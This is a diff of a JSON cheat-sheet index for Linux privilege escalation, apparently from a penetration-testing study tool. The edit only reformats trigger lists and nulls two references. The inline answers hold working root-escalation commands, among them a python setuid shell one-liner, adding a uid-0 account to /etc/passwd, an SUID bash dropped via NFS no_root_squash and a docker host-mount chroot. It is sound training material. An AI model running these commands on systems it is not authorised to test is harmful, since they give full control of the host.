@@ -1,7 +1,14 @@
 [
   {
     "slug": "sudo-l-abuse",
-    "triggers": ["sudo -l", "sudo abuse", "sudo privesc", "gtfobins sudo", "sudo nopasswd", "sudo allowed"],
+    "triggers": [
+      "sudo -l",
+      "sudo abuse",
+      "sudo privesc",
+      "gtfobins sudo",
+      "sudo nopasswd",
+      "sudo allowed"
+    ],
     "title": "sudo -l → escalate",
     "answer_type": "inline",
     "inline_answer": "```\nsudo -l\n```\n\nFor every allowed binary check **GTFOBins → Sudo**. Watch for: `(ALL) NOPASSWD: ALL`; `env_keep+=LD_PRELOAD` / `LD_LIBRARY_PATH`; `(user)` not root (pivot to that user); a script you can edit; `sudoedit` / wildcard. Also `sudo --version` ≤1.8.31 → Baron Samedit (CVE-2021-3156).",
@@ -11,7 +18,14 @@
   },
   {
     "slug": "suid-find",
-    "triggers": ["suid find", "find suid", "suid binaries", "setuid privesc", "find perm 4000", "suid privesc"],
+    "triggers": [
+      "suid find",
+      "find suid",
+      "suid binaries",
+      "setuid privesc",
+      "find perm 4000",
+      "suid privesc"
+    ],
     "title": "Find & abuse SUID binaries",
     "answer_type": "inline",
     "inline_answer": "```\nfind / -perm -4000 -type f 2>/dev/null\n```\n\nCross-check each non-standard hit against **GTFOBins → SUID**. Custom SUID binary? `strings`/`ltrace` it for a relative-path command call → PATH hijack. SGID: `-perm -2000`.",
@@ -21,7 +35,13 @@
   },
   {
     "slug": "linux-capabilities",
-    "triggers": ["capabilities privesc", "getcap", "cap_setuid", "linux capabilities", "cap_dac_read_search"],
+    "triggers": [
+      "capabilities privesc",
+      "getcap",
+      "cap_setuid",
+      "linux capabilities",
+      "cap_dac_read_search"
+    ],
     "title": "Linux capabilities → root",
     "answer_type": "inline",
     "inline_answer": "```\ngetcap -r / 2>/dev/null\n```\n\n`cap_setuid+ep` on python/perl/php → instant root (`python3 -c 'import os;os.setuid(0);os.system(\"/bin/sh\")'`). `cap_dac_read_search` → read any file (shadow). `cap_dac_override` → write any file. Check GTFOBins → Capabilities.",
@@ -31,7 +51,13 @@
   },
   {
     "slug": "writable-passwd",
-    "triggers": ["writable etc passwd", "/etc/passwd writable", "openssl passwd root", "passwd privesc", "add root user passwd"],
+    "triggers": [
+      "writable etc passwd",
+      "/etc/passwd writable",
+      "openssl passwd root",
+      "passwd privesc",
+      "add root user passwd"
+    ],
     "title": "Writable /etc/passwd → root",
     "answer_type": "inline",
     "inline_answer": "```\nopenssl passwd -1 -salt x Pass123          # -> $1$x$...\necho 'r00t:$1$x$...:0:0:root:/root:/bin/bash' >> /etc/passwd\nsu r00t        # Pass123\n```\n\nAlso check writable `/etc/shadow` (replace root's hash) and writable `/etc/sudoers` / `sudoers.d`.",
@@ -41,7 +67,14 @@
   },
   {
     "slug": "cron-privesc",
-    "triggers": ["cron privesc", "pspy", "writable cron", "cron job abuse", "wildcard injection", "tar wildcard"],
+    "triggers": [
+      "cron privesc",
+      "pspy",
+      "writable cron",
+      "cron job abuse",
+      "wildcard injection",
+      "tar wildcard"
+    ],
     "title": "Cron job abuse",
     "answer_type": "inline",
     "inline_answer": "```\ncat /etc/crontab; ls -la /etc/cron.*; ./pspy64        # watch for root jobs\n```\n\nWritable script run by root → append a reverse shell. Root cron calling a relative binary → PATH hijack. `tar *`/`rsync *` in a writable dir → wildcard injection (`--checkpoint-action=exec`). pspy reveals jobs not in crontab.",
@@ -51,7 +84,13 @@
   },
   {
     "slug": "nfs-no-root-squash",
-    "triggers": ["no_root_squash", "nfs privesc", "showmount", "nfs root", "nfs no root squash"],
+    "triggers": [
+      "no_root_squash",
+      "nfs privesc",
+      "showmount",
+      "nfs root",
+      "nfs no root squash"
+    ],
     "title": "NFS no_root_squash → root",
     "answer_type": "inline",
     "inline_answer": "```\nshowmount -e TARGET                  # look for an export with no_root_squash\nmkdir /mnt/x && mount -o rw TARGET:/export /mnt/x\n# as root on Kali:\ncp /bin/bash /mnt/x/bash && chmod +s /mnt/x/bash\n# on target as the low user:\n/export/bash -p          # euid root\n```",
@@ -61,7 +100,14 @@
   },
   {
     "slug": "linux-group-abuse",
-    "triggers": ["docker group", "lxd privesc", "disk group", "adm group", "container escape group", "id shows docker"],
+    "triggers": [
+      "docker group",
+      "lxd privesc",
+      "disk group",
+      "adm group",
+      "container escape group",
+      "id shows docker"
+    ],
     "title": "Dangerous group membership (docker/lxd/disk/adm)",
     "answer_type": "inline",
     "inline_answer": "From `id`:\n\n- **docker** → `docker run -v /:/mnt -it alpine chroot /mnt sh`\n- **lxd/lxc** → import Alpine image, init container with `security.privileged`, mount `/`\n- **disk** → `debugfs /dev/sda1` → read/write any file (shadow, sudoers)\n- **adm** → read all logs (creds, paths) — not direct root but high-value",
@@ -71,16 +117,28 @@
   },
   {
     "slug": "privesc-three-questions",
-    "triggers": ["privesc questions", "three questions privesc", "privesc mental model", "how to think privesc", "where to start privesc"],
+    "triggers": [
+      "privesc questions",
+      "three questions privesc",
+      "privesc mental model",
+      "how to think privesc",
+      "where to start privesc"
+    ],
     "title": "The three privesc questions (always ask)",
     "answer_type": "chunk_ref",
-    "target_chunk_id": "BUS_REVIEW/OffSec_PrivEsc_Mental_Model.md#the-three-questions-always-ask",
+    "target_chunk_id": null,
     "tags": "privesc methodology decision",
     "priority": 185
   },
   {
     "slug": "linux-privesc-workflow",
-    "triggers": ["linux privesc", "linux privesc workflow", "how to privesc linux", "linux priv esc start", "escalate linux"],
+    "triggers": [
+      "linux privesc",
+      "linux privesc workflow",
+      "how to privesc linux",
+      "linux priv esc start",
+      "escalate linux"
+    ],
     "title": "Linux privesc — workflow (start here)",
     "answer_type": "chunk_ref",
     "target_chunk_id": "_CHEATSHEETS/Linux_PrivEsc.md#workflow-start-here",
@@ -89,16 +147,27 @@
   },
   {
     "slug": "linux-high-roi",
-    "triggers": ["linux high roi", "common linux privesc", "linux engagement failures", "linux privesc patterns", "linux privesc priority"],
+    "triggers": [
+      "linux high roi",
+      "common linux privesc",
+      "linux engagement failures",
+      "linux privesc patterns",
+      "linux privesc priority"
+    ],
     "title": "High-ROI Linux privesc patterns",
     "answer_type": "chunk_ref",
-    "target_chunk_id": "BUS_REVIEW/OffSec_PrivEsc_Mental_Model.md#high-roi-linux-patterns-these-cause-engagement-failures",
+    "target_chunk_id": null,
     "tags": "linux privesc methodology",
     "priority": 180
   },
   {
     "slug": "linux-privesc-stuck",
-    "triggers": ["linux privesc stuck", "nothing works linux", "linux privesc failure", "linux escalation stuck"],
+    "triggers": [
+      "linux privesc stuck",
+      "nothing works linux",
+      "linux privesc failure",
+      "linux escalation stuck"
+    ],
     "title": "Linux privesc — failure branch (stuck)",
     "answer_type": "chunk_ref",
     "target_chunk_id": "_CHEATSHEETS/Linux_PrivEsc.md#15-failure-branch-when-nothing-works",
@@ -107,7 +176,14 @@
   },
   {
     "slug": "kernel-exploit-linux",
-    "triggers": ["kernel exploit linux", "dirtypipe", "pwnkit", "dirtycow", "linux kernel privesc", "uname exploit"],
+    "triggers": [
+      "kernel exploit linux",
+      "dirtypipe",
+      "pwnkit",
+      "dirtycow",
+      "linux kernel privesc",
+      "uname exploit"
+    ],
     "title": "Linux kernel exploits (last resort)",
     "answer_type": "chunk_ref",
     "target_chunk_id": "_CHEATSHEETS/Linux_PrivEsc.md#9-kernel-exploits-last-resort",
@@ -116,7 +192,12 @@
   },
   {
     "slug": "linux-cred-hunt-privesc",
-    "triggers": ["linux privesc creds", "find creds linux privesc", "history files privesc", "ssh keys privesc"],
+    "triggers": [
+      "linux privesc creds",
+      "find creds linux privesc",
+      "history files privesc",
+      "ssh keys privesc"
+    ],
     "title": "Credential hunting for privesc (Linux)",
     "answer_type": "chunk_ref",
     "target_chunk_id": "_CHEATSHEETS/Linux_PrivEsc.md#8-credential-hunting",
@@ -125,7 +206,13 @@
   },
   {
     "slug": "shared-object-hijack",
-    "triggers": ["shared object hijack", "ld_preload", "library hijack linux", ".so hijack", "ld_library_path privesc"],
+    "triggers": [
+      "shared object hijack",
+      "ld_preload",
+      "library hijack linux",
+      ".so hijack",
+      "ld_library_path privesc"
+    ],
     "title": "Shared object / library hijacking",
     "answer_type": "chunk_ref",
     "target_chunk_id": "_CHEATSHEETS/Linux_PrivEsc.md#12-shared-object-library-hijacking",
